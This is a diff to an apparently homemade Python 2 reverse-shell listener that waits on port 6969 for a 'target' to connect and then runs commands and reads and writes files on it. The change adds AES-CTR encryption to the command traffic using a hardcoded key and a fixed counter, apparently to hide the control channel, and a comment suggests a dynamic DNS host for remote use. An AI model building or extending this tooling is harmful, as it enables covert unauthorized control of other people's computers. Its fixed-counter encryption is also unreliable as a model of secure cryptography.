@@ -2,10 +2,13 @@
 # -*- encoding: utf-8 -*-
 
 import base64,json,socket,sys
-
+from Crypto.Cipher import AES
 ip='192.168.56.1' # can use noip dns
 print (ip)
 port = 6969
+
+counter = "H"*16
+key = "H"*32
 
 # color codes..................
 red="\033[1;32;31m"
@@ -68,12 +71,32 @@ class listener:
         self.conn, addr = listener.accept()
         print green,"target ", str(addr), "is on...",r
 
-    def json_send(self,data):
+    def encrypt(self,message):
+        self.encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
+        return self.encrypto.encrypt(message)
+
+    def decrypt(self,message):
+        self.decrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
+        return self.decrypto.decrypt(message)
+
+    def json_send(self, data):
         try:
-            json_data=json.dumps(data)
-            return self.conn.send(json_data)
+            json_data = json.dumps(data)
+            return self.conn.send(self.encrypt(json_data))
         except:
+            return self.conn.send(self.encrypt("[-] STDOUT parsing problem [-]"))
             pass
+
+    def receive(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.conn.recv(4096)
+                return json.loads(self.decrypt(json_data))
+            except ValueError:
+                continue
+            except:
+                pass
 
     def write_file(self,path,content):
         try:
@@ -90,14 +113,6 @@ class listener:
         except :
             return "[-] no such file or directory [-]"
 
-    def receive(self):
-        json_data = ""
-        while True:
-            try:
-                json_data = json_data + self.conn.recv(4096)
-                return json.loads(json_data)
-            except ValueError:
-                continue
 
     def execution(self, cmd):
         if cmd[0]=="exit":
@@ -181,4 +196,3 @@ if __name__ == '__main__':
         sys.exit(0)
     except Exception,e:
         print e
-
